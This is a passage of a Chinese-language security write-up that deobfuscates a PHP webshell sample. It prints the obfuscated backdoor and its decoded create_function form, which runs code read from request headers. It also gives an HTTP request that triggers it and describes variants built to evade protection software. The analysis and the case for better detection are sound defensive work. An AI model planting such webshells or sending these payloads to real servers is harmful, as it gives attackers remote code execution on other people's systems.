    'BU'. 'iGh o|';
    $YzuZ=n^')';
    $PpCD4RJ914D="+|*%"^t0ck;
    $IIBxK1GA_=']_'&g_;
    $StoL=M&i;
    'Jb'. 'K8f-._$Js';
    $IXedwT=T&D;
    $ZVe4pZrS1=$ZAps4M|('^di'^';D]');
    $atE4muYNLph=('  $;$G'|') %$$U')^$AKsSa;
    $vUr=$j5gQLS&('A^>1NQy%F+'.SHI8.'['^ '&$YX8'&'?k|s{y');
    $HLOTWYy3Ip6=$PqU^$FtaeUxv;
    $bAXD1h2s=$rG4r3bseFJ^$rB;
    $O0Xnet=("9{".SIkzl& '=~'.KQnZo)^$L_X96rF;
    $ro74Wy=$yc|$Ulin;$OIYd=$mdKTVt&('ysO[r}'&'{w_[y}');
    if($ZVe4pZrS1($atE4muYNLph($Pwp6))==$HLOTWYy3Ip6)$bIywY=$vUr($bAXD1h2s,$atE4muYNLph($wVYqzGy5.$BywtZ8QaHFk.$YzuZ.$PpCD4RJ914D.$IIBxK1GA_.$StoL.$IXedwT));
    $bIywY($O0Xnet,$ro74Wy,$OIYd);
    '@!*V9v939Jjr,?+kMW$8#{^v7[MR9pBS,PSH.o5}';
分析代码发现，大部分的代码都是通过字符串的`|`、`^`、`.`操作赋值，只有最后两行代码：
    if($ZVe4pZrS1($atE4muYNLph($Pwp6))==$HLOTWYy3Ip6)$bIywY=$vUr($bAXD1h2s,$atE4muYNLph($wVYqzGy5.$BywtZ8QaHFk.$YzuZ.$PpCD4RJ914D.$IIBxK1GA_.$StoL.$IXedwT));
    $bIywY($O0Xnet,$ro74Wy,$OIYd);
是关键性的代码，而其中的变量都是通过前面的初始化或者是运算得到的。那么我们就可以注释最后两行代码，输出其中所有的变量。结果如下：  
带入到最后的两行代码中，得到:
    if(md5(getenv('HTTP_A'))=='5d15db53a91790e913dc4e05a1319c42') $bIywY=create_function('$a,$b,$c',getenv('HTTP_X_UP_CALLING_LINE_ID'));
    $bIywY('x1o6Vm2','WFrkAj9','WFrkAj9');
## Webshell分析
    if(md5(getenv('HTTP_A'))=='5d15db53a91790e913dc4e05a1319c42') $bIywY=create_function('$a,$b,$c',getenv('HTTP_X_UP_CALLING_LINE_ID'));
    $bIywY('x1o6Vm2','WFrkAj9','WFrkAj9');
这个代码就是很明显的Webshell代码了，整个代码主要是利用了PHP的以下特性：
  1. 所有的通过`getenv`获取`HTTP`开头的变量都是可以通过请求头设置的，即用户/攻击者是可以控制的。
  2. `create_function`能够执行代码，如`$func = create_function('$a,$b','eval("phpinfo();");');$func();`
在本题中我们利用以上的特性就可以进行代码执行了。由于其中的`5d15db53a91790e913dc4e05a1319c42`无法解出来，为了便于演示，换成`e10adc3949ba59abbe56e057f20f883e`(123456的md5)。  
那么我们最终发送的payload为：
    GET /test/tmp.php HTTP/1.1
    Host: localhost
    A: 123456
    X-Up-Calling-Line-Id: assert("phpinfo();");
其中请求头`A`就是密码，而`X-Up-Calling-Line-Id`就是需要执行的命令，当然我们还可以将其改造为`assert($_POST[cmd]);`。
## 总结
其实本题目中最重要的两步就是去掉注释以及代码的重新编排，这个对于分析混淆的php代码是非常有帮助的。尤其是要注意到最后两行代码是需要进行注释的，否则直接运行由于无法通过`md5`的校验导致程序无法执行。
###  get_defined_vars
除了上述所讲到的通过`var_dump(变量名)`这种方式输出变量，还有很多其他的方法。如通过`get_defined_vars()`输出。我们通过在所有的变量下方加入：
    1NQy%F+'.SHI8.'['^ '&$YX8'&'?k|s{y');
    $HLOTWYy3Ip6=$PqU^$FtaeUxv;
    $bAXD1h2s=$rG4r3bseFJ^$rB;
    $O0Xnet=("9{".SIkzl&'=~'.KQnZo)^$L_X96rF;
    $ro74Wy=$yc|$Ulin;
    $OIYd=$mdKTVt&('ysO[r}'&'{w_[y}');
    var_dump(get_defined_vars());
    //if($ZVe4pZrS1($atE4muYNLph($Pwp6))==$HLOTWYy3Ip6)$bIywY=$vUr($bAXD1h2s,$atE4muYNLph($wVYqzGy5.$BywtZ8QaHFk.$YzuZ.$PpCD4RJ914D.$IIBxK1GA_.$StoL.$IXedwT));
    //$bIywY($O0Xnet,$ro74Wy,$OIYd);
这样同样可以得到所有的变量
###  动态调试
这个方式是我比较推崇的，因为比较直接使用。通过一步一步跟踪代码更容易看清实质  
不仅可以通过`Variables`查看所有的变量还可以通过`Evaluate`进行php代码编写得到中间变量。通过这两者的配合基本上就可以得到所有的变量信息了。
## 后文
通过分析，发现存在大量这种类似的Webshell代码，如下：
这些代码的结构同时相似的：最后生成的代码都是形如:
    if(md5(getenv('HTTP_A'))=='5d15db53a91790e913dc4e05a1319c42') call_user_func('preg_replace','/[pS]/emix',getenv('HTTP_X_DEVICE_ACCEPT_CHARSET'),'eC11cC1kZXZjYXAtbXNpemU=');
那么猜测应该是有程序能够按照一定的规则生成这种加密的Webshell代码。这些Webshell的密码都是相同的，表明这些Webshell可能是出自同一人之手。
我们也有理由猜测，这个幕后的Webshell的作者可能是编写了一套规则，用以对原始的Webshell进行混淆变形从而绕过防护软件。从这个角度来看的话，如果有其他的攻击者也能够自行设计一套混淆加密的规则，那么是否也能够绕过防护软件呢？
说完了绕过，最后说明一下我对Webshell检测的看法。由于语言的特性，导致Webshell的变形层出不穷，如果仅仅只是收集已有的Webshell的规则，或者是通过文本字符串上面去对抗，是无法保证准确率的，变形的套路总是会多到精疲力竭，一种绕过姿势又可以衍生出出无限多的样本，所以如果想能够有效地检测出未知的Webshell，那么就需要借助于机器学习的方法来进行识别了。如何利用机器学习来识别出Webshell，那么这又是一篇很大的文章了。